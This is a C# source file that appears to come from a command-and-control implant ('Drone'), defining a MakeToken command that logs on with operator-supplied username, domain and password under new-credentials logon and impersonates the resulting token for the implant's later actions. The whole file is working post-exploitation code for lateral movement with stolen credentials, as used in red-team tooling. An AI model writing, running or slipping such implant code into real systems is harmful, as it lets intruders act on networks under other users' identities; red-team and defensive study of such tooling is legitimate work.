using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

namespace Drone.Commands;

using static Interop.Methods;
using static Interop.Data;

public sealed class MakeToken : DroneCommand
{
    public override byte Command => 0x2A;
    public override bool Threaded => false;

    public override Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        var hToken = LogonUserW(
            task.Arguments["username"],
            task.Arguments["domain"],
            task.Arguments["password"],
            LOGON_USER_TYPE.LOGON32_LOGON_NEW_CREDENTIALS,
            LOGON_USER_PROVIDER.LOGON32_PROVIDER_WINNT50);

        if (hToken == IntPtr.Zero)
            throw new Win32Exception(Marshal.GetLastWin32Error());
        
        RevertToSelf();

        if (!ImpersonateToken(hToken))
        {
            CloseHandle(hToken);
            throw new Win32Exception(Marshal.GetLastWin32Error());
        }

        Drone.ImpersonationToken = hToken;
        return Task.CompletedTask;
    }
}